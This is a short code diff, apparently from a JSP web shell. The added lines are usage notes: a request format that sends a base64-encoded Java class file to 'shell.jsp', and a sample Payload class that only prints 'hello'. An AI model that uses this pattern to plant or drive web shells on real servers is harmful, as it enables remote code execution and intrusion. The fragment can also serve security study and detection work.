@@ -136,3 +136,16 @@ if (cls != null && !cls.isEmpty()) {
     instance.equals(pageContext);
 }
 %>
+
+
+--------------호출
+http://target/shell.jsp?ant=BASE64(클래스파일)
+
+
+public class Payload {
+    @Override
+    public boolean equals(Object obj) {
+        System.out.println("hello");
+        return true;
+    }
+}
